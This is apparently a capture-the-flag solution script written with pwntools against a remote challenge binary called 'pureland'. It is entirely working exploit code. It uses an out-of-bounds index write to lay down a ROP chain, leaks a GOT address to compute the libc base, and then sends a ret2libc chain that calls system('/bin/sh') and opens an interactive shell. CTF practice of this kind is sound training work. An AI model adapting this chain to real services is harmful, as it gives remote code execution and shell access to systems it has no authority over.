from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# p=process('./pureland',env={"LD_PRELOAD":"./libc.so.6"})
p=remote("challs.ifctf.fibonhack.it",10013)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
def cmd(c):
    sla(b":\n",str(c).encode())
def sn(c):
    sla(b": \n",str(c).encode())
def SET(idx,val):
    cmd("1")
    sn(idx)
    sn(val)
def sum():
    cmd(3)
def dumpROP(chain):
    for _ in range(len(chain)):
        SET(int(0x50c0//8)-1+_,chain[_])
rdi = 0x404f77
rsi = 0x4045de
got = 0x4e3328
rd = 0x4031A0
mv_rdx_rsi = 0x4b6d6e
ret = rdi+1
sys_write = 0x403190
SET(0x00,0x10000)
sum()
SET(0x14,0x4900ee)
dumpROP([rdi,1,rsi,0x400, mv_rdx_rsi, rsi,got,sys_write]+[rdi,0,rsi,0x100,mv_rdx_rsi,rsi,0x42004092b0,rd])
cmd(4)
base = u64(p.read(6)+b'\0\0')-(0x7ffff7da45b0-0x00007ffff7d04000)-(0x7ffff7db5410-0x00007ffff7dbb000)
p.read()
info(hex(base))
libc = ELF("./libc.so.6")
libc.address =base
p.send(flat([rdi,libc.search(b'/bin/sh').__next__(),libc.sym['system']]))
p.interactive()
